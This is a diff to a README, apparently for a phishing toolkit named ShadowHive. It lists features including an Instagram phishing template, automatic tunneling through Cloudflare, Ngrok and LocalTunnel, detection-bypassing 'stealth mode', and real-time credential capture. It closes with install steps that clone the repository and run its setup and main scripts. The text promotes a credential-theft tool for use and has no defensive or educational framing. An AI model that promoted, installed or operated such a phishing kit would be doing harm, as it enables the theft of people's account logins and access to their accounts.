@@ -13,20 +13,27 @@
 
 </div>
 
+---
+
 ## 🌟 Features
-- instgram Phishing Template
-- Auto-Tunneling (Cloudflare/Ngrok/Localtunnel)
-- Stealth Mode (Bypasses Basic Detection)
-- No Root Required
-- Real-time Credential Capture
-- Mobile-Optimized Pages
+
+- [x] **Instagram** Phishing Template
+- [x] **Auto-Tunneling** (Cloudflare / Ngrok / LocalTunnel)
+- [x] **Stealth Mode** – Bypasses basic detection
+- [x] **No Root Required**
+- [x] **Real-Time Credential Capture**
+- [x] **Mobile-Optimized Phishing Pages**
+
+---
 
 ## 🚀 Quick Start
 
 ### Installation
+
 ```bash
 pkg update -y && pkg upgrade -y
 pkg install -y git python
 git clone https://github.com/EgaleX5/ShadowHive.git
 cd ShadowHive
+bash setup.sh   # First-time setup
 python3 joker-Eye.py
